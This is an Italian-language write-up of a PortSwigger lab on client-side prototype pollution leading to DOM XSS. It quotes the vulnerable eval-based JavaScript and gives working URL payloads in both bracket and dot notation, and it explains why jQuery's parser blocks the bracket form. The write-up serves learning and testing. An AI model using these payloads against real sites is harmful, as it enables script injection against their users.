# Prototype Pollution e Parser

Quando si cerca di fare una **prototype pollution**, è necessario fare attenzione al parser che viene utilizzato per il nostro input.

## Esempio di Challenge

Nella challenge di PortSwigger [Prototype Pollution DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector), vengono aggiunte all'oggetto `manager.params` le proprietà inserite nei parametri URL.

### Codice di esempio

```javascript
async function searchLogger() {
    window.macros = {};
    window.manager = {
        params: $.parseParams(new URL(location)),
        macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property];
        }
    };
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if (manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}
```

### Payload per Prototype Pollution

Per fare in modo che la funzione `eval` chiami un `alert()`, basterebbe inviare il seguente payload:

```
/?__proto__[sequence]=alert())}//
```

> **Nota:** È necessario evitare quell'`1` che viene aggiunto e quindi bisogna chiudere le parentesi.

### Problema con il Parser di jQuery

Il parser di jQuery interpreta `__proto__[sequence]` come `__proto__[NaN]`, impedendo la prototype pollution.

### Soluzione: Dot Notation

Per eseguire correttamente la prototype pollution, è necessario utilizzare la **dot notation**:

```
/?__proto__.sequence=alert())}//
```